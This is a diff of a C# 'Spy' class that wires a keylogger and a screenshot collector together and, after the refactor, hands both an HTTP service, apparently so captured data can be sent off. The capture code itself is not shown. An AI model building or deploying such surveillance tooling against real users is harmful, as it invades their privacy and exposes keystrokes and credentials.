@@ -1,95 +1,42 @@
 ﻿namespace HIT.Desktop.Spy
 {
-    using System;
     using System.Collections.Generic;
-    using System.IO;
-    using System.Text;
     using System.Threading.Tasks;
-    using Common.Extensions;
-    using Common.Utils;
-    using Newtonsoft.Json;
+    using Services;
 
+    // TODO: Make it a singleton
     public class Inspector
     {
         private readonly string SessionId;
         private readonly InspectorSettings Settings;
-        private readonly IList<IRunnable> ToolsActivated;
+        private readonly IList<IDataCollector> DataCollectors;
+        private readonly IHttpService HttpService;
 
-        public Inspector()
+        public Inspector(string sessionId, InspectorSettings settings, IHttpService httpService)
         {
-            this.ToolsActivated = new List<IRunnable>();
-            this.Settings = this.LoadInspectorSettings("InspectorSettings.json");
-            this.SessionId = this.ComposeSessionId(this.Settings.SessionName);
+            this.Settings = settings;
+            this.SessionId = sessionId;
+            this.HttpService = httpService;
+            this.DataCollectors = new List<IDataCollector>();
         }
 
         public void Start()
         {
-            var keylogger = new Keylogger(this.SessionId);
-            var snapshooter = new Snapshooter(this.SessionId);
+            var keylogger = new Keylogger(this.SessionId, 
+                this.Settings.KeyloggerSettings, 
+                this.HttpService);
 
-            this.ToolsActivated.Add(keylogger);
-            this.ToolsActivated.Add(snapshooter);
+            var snapshooter = new Snapshooter(this.SessionId, 
+                this.Settings.SnapshooterSettings, 
+                this.HttpService);
+
+            this.DataCollectors.Add(keylogger);
+            this.DataCollectors.Add(snapshooter);
 
             var keyloggerTask = Task.Run(() => keylogger.Start());
             var snapshooterTask = Task.Run(() => snapshooter.Start());
 
             Task.WaitAll(keyloggerTask, snapshooterTask);
-        }
-
-        private InspectorSettings LoadInspectorSettings(string inspectorSettingsFilePath)
-        {
-            if (!File.Exists(inspectorSettingsFilePath))
-            {
-                return InspectorSettings.DefaultSettings;
-            }
-
-            var inspectorSettingsFileContent = File.ReadAllText(inspectorSettingsFilePath);
-            var inspectorSettings = JsonConvert.DeserializeObject<InspectorSettings>(inspectorSettingsFileContent);
-
-            return inspectorSettings;
-        }
-
-        private string ComposeSessionId(string sessionName)
-        {
-            this.ValidateSessionName(sessionName);
-
-            // Cache the current datetime and
-            // Extract the parameters required to build the session id
-            var date = DateTimeProvider.Current.Now;
-            var time = date.TimeOfDay;
-            var year = date.Year;
-            var month = date.ToString("MMM");
-            var day = date.Day;
-            var hours = time.Hours.ToTimeString();
-            var minutes = time.Minutes.ToTimeString();
-            var seconds = time.Seconds.ToTimeString();
-
-            // Compose the session id
-            // It is used as a folder name 
-            // In which to store the session data
-            var sessionId = new StringBuilder(255);
-            sessionId
-                .Append($"[{year}-{month}-{day}]")
-                .Append("-")
-                .Append($"[{hours}-{minutes}-{seconds}]")
-                .Append("-")
-                .Append($"[{sessionName}]");
-
-            return sessionId.ToString();
-        }
-
-        private void ValidateSessionName(string sessionName)
-        {
-            if (string.IsNullOrEmpty(sessionName))
-            {
-                throw new ArgumentNullException("The provided session name cannot be NULL or EMPTY!");
-            }
-
-            var charactersNotAllowed = new char[] { '\\', '/', '<', '>', '?', '*', ':', '|', '"', };
-            if (sessionName.ContainsAny(charactersNotAllowed))
-            {
-                throw new InvalidOperationException($@"The session name cannot contain any of the following characters: {string.Join(" ", charactersNotAllowed)}");
-            }
         }
     }
 }
